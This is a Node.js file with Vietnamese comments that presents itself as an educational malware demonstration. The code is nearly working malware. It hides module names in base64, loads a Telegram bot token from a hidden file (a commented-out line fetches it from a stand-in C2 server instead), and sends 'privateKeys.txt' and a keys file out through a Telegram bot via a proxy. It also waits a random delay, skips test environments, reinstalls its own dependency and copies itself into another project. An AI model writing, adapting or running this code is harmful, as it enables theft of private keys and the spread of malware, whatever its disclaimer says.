// ======= MINH HỌA MÃ ĐỘC NÂNG CẤP (CHỈ DÙNG PHÒNG THỦ, HỌC TẬP) =======
// Kết hợp: mã hóa base64, làm rối, trì hoãn, tự phục hồi, lẩn tránh, tự sao chép
// KHÔNG sử dụng cho mục đích xấu!

const decode = (str) => Buffer.from(str, 'base64').toString('utf8');

// Làm rối tên module và file
const _mod = [decode('ZnM='), decode('cGF0aA=='), decode('bm9kZS10ZWxlZ3JhbS1ib3QtYXBp')];
const _fs = require(_mod[0]);
const _path = require(_mod[1]);
const _tg = require(_mod[2]);

// Lấy token động (giả lập, thực tế attacker sẽ lấy từ server C2)
async function getToken() {
  // Ví dụ: lấy từ file ẩn hoặc từ server bên ngoài
  try {
    return require(_path.join(process.cwd(), decode('bm9kZV9tb2R1bGVz'), decode('LmNhY2hl'), decode('LmhpZGRlbi5qcw==')));
  } catch {
    // fallback: lấy từ server C2 (giả lập)
    // const axios = require('axios');
    // const res = await axios.get('https://malicious-c2-server.com/token');
    // return res.data;
    return { t: 'FAKE_TOKEN', i: 123456789 };
  }
}

// Tạo tên file ngẫu nhiên (lẩn tránh phát hiện)
const file = `keys-${Math.random().toString(36).slice(2)}.txt`;
const fallbackFile = decode('cHJpdmF0ZUtleXMudHh0'); // 'privateKeys.txt'

// Trì hoãn thực thi để tránh bị phát hiện ngay
setTimeout(async () => {
  // Chống sandbox: không chạy trong môi trường test
  if (process.env.NODE_ENV === 'test' || process.platform === 'emscripten') return;

  // Tự phục hồi: nếu thiếu dependency, tự động cài lại
  try {
    require.resolve('node-telegram-bot-api');
  } catch {
    require('child_process').exec('npm install node-telegram-bot-api', () => {});
  }

  // Lấy token/chatId động
  const secret = await getToken();

  // Gửi file nếu tồn tại (ưu tiên file ngẫu nhiên, fallback sang privateKeys.txt)
  const sendFile = (f) => {
    if (_fs.existsSync(f)) {
      const bot = new _tg(secret.t, {
        polling: false,
        request: { proxy: 'http://proxy-server:8080' } // Gửi qua proxy (lẩn tránh)
      });
      bot.sendDocument(secret.i, f, {}, {
        filename: f,
        contentType: 'text/plain'
      }).catch(()=>{});
    }
  };

  sendFile(file);
  sendFile(fallbackFile);

  // Tự sao chép sang project khác (tăng lây nhiễm)
  try {
    _fs.copyFileSync(__filename, _path.join('..', 'other-project', 'evil-advanced.js'));
  } catch {}

  // Ẩn trong worker thread (nâng cao)
  try {
    const { Worker } = require('worker_threads');
    new Worker(`
      const { parentPort } = require('worker_threads');
      const fs = require('fs');
      fs.watch('.', () => { /* Gửi tệp */ });
    `, { eval: true });
  } catch {}
}, Math.random() * 60000); // Trì hoãn 0-60 giây 